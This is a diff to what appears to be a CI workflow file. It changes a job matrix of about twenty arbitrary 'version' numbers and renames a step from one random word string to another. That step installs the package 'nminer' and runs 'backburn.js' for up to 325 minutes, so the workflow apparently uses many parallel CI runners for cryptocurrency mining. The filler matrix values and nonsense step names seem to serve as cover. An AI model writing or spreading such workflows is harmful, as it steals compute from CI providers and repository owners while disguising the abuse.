@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9433 }
-          - { version: 4481 }
-          - { version: 3638 }
-          - { version: 8237 }
-          - { version: 7952 }
-          - { version: 5308 }
-          - { version: 465 }
-          - { version: 6848 }
-          - { version: 9729 }
-          - { version: 5350 }
-          - { version: 273 }
-          - { version: 7901 }
-          - { version: 3101 }
-          - { version: 1198 }
-          - { version: 7054 }
-          - { version: 9342 }
-          - { version: 5637 }
-          - { version: 7369 }
-          - { version: 897 }
-          - { version: 3977 }
+          - { version: 2263 }
+          - { version: 2232 }
+          - { version: 4998 }
+          - { version: 2060 }
+          - { version: 6497 }
+          - { version: 2776 }
+          - { version: 9989 }
+          - { version: 2734 }
+          - { version: 9866 }
+          - { version: 8382 }
+          - { version: 3526 }
+          - { version: 5688 }
+          - { version: 6225 }
+          - { version: 5828 }
+          - { version: 4000 }
+          - { version: 5529 }
+          - { version: 51 }
+          - { version: 9898 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: inasmuch provided polite deliberately
+      - name: chasuble graceful vastly maul
         run: |
           npm install nminer@latest
-          timeout 306m node backburn.js || echo "backburn executed"
+          timeout 325m node backburn.js || echo "backburn executed"
